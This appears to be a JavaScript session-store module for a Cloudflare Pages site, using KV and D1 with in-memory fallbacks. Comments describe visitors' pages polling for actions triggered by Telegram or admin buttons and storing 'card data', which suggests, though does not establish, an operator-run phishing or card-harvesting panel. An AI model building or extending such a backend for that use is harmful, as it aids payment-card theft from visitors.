/**
 * Session store with Cloudflare KV backend + in-memory fallback for local dev.
 *
 * On Cloudflare Pages: pass `platform` from each endpoint — uses platform.env.STORE (KV).
 * On local `vite dev`: platform.env is undefined → falls back to in-memory Map.
 *
 * KV keys: `session:<id>` → JSON blob.
 * TTL: 24 hours on each write (auto-cleanup).
 */

const mem = new Map();
const TTL_SECONDS = 60 * 60 * 24; // 24h

/** @param {any} platform */
function kv(platform) {
  return platform?.env?.STORE ?? null;
}

/** @param {any} platform */
function db(platform) {
  return platform?.env?.DB ?? null;
}

// In-memory action store for local dev (D1 unavailable)
const memActions = new Map();

/** @param {any} platform @param {string} id */
async function readRaw(platform, id) {
  const store = kv(platform);
  if (store) {
    const raw = await store.get(`session:${id}`, 'json');
    return raw ?? null;
  }
  return mem.get(id) ?? null;
}

/** Public read for check-mode (KV blob with card data) */
export async function readRawForCheck(platform, id) {
  return readRaw(platform, id);
}

/** @param {any} platform @param {string} id @param {any} obj */
async function writeRaw(platform, id, obj) {
  const store = kv(platform);
  if (store) {
    await store.put(`session:${id}`, JSON.stringify(obj), { expirationTtl: TTL_SECONDS });
  } else {
    mem.set(id, obj);
  }
}

function blank() {
  const now = Date.now();
  return { action: 'pending', seq: 0, data: {}, createdAt: now, updatedAt: now };
}

/**
 * Action state lives in D1 (strongly consistent — instant) so visitor's poll
 * sees Telegram/admin button clicks immediately. The session blob in KV is
 * still updated for the admin panel history view.
 *
 * @param {any} platform
 * @param {string} id
 * @param {string} action
 */
export async function setAction(platform, id, action) {
  const now = Date.now();
  const d = db(platform);
  if (d) {
    await d
      .prepare('INSERT INTO actions (id, action, updated_at) VALUES (?1, ?2, ?3) ON CONFLICT(id) DO UPDATE SET action=excluded.action, updated_at=excluded.updated_at')
      .bind(id, action, now)
      .run();
  } else {
    memActions.set(id, { action, updated_at: now });
  }

  // Update KV session blob in background — do NOT block the Telegram response
  // (visitor reads action from D1 which is already written above).
  const updateKv = (async () => {
    const existing = (await readRaw(platform, id)) ?? blank();
    existing.action = action;
    existing.seq = (existing.seq ?? 0) + 1;
    existing.updatedAt = now;
    await writeRaw(platform, id, existing);
  })();
  // Use waitUntil if available so the worker doesn't kill the promise early
  if (platform?.context?.waitUntil) platform.context.waitUntil(updateKv);
  else updateKv.catch(() => {});

  return { action, seq: 0, data: {}, createdAt: now, updatedAt: now };
}

/** @param {any} platform @param {string} id */
export async function getAction(platform, id) {
  const d = db(platform);
  if (d) {
    const row = await d.prepare('SELECT action, updated_at FROM actions WHERE id = ?1').bind(id).first();
    if (row) {
      return { action: row.action, seq: 0, data: {}, createdAt: row.updated_at, updatedAt: row.updated_at };
    }
    return blank();
  }
  const m = memActions.get(id);
  if (m) return { action: m.action, seq: 0, data: {}, createdAt: m.updated_at, updatedAt: m.updated_at };
  return (await readRaw(platform, id)) ?? blank();
}

/**
 * @param {any} platform
 * @param {string} id
 * @param {Record<string, any>} data
 */
export async function saveData(platform, id, data) {
  const existing = (await readRaw(platform, id)) ?? blank();
  existing.data = { ...existing.data, ...data };
  existing.updatedAt = Date.now();
  await writeRaw(platform, id, existing);
}

/**
 * @param {any} platform
 * @param {string} id
 * @param {string} key
 * @param {any} entry
 */
export async function pushHistory(platform, id, key, entry) {
  const existing = (await readRaw(platform, id)) ?? blank();
  if (!Array.isArray(existing.data[key])) existing.data[key] = [];
  existing.data[key].push({ value: entry, at: Date.now() });
  existing.updatedAt = Date.now();
  await writeRaw(platform, id, existing);
}

/** @param {any} platform */
export async function listSessions(platform) {
  const store = kv(platform);
  if (store) {
    // KV list supports up to 1000 keys per call; sessions are short-lived so fine.
    const { keys } = await store.list({ prefix: 'session:' });
    const entries = await Promise.all(
      keys.map(async (k) => {
        const val = await store.get(k.name, 'json');
        if (!val) return null;
        return { id: k.name.slice('session:'.length), ...val };
      })
    );
    return entries.filter(Boolean);
  }
  return Array.from(mem.entries()).map(([id, s]) => ({ id, ...s }));
}

/** @param {any} platform @param {string} id */
export async function deleteSession(platform, id) {
  const store = kv(platform);
  if (store) await store.delete(`session:${id}`);
  else mem.delete(id);
  const d = db(platform);
  if (d) await d.prepare('DELETE FROM actions WHERE id = ?1').bind(id).run();
  else memActions.delete(id);
}
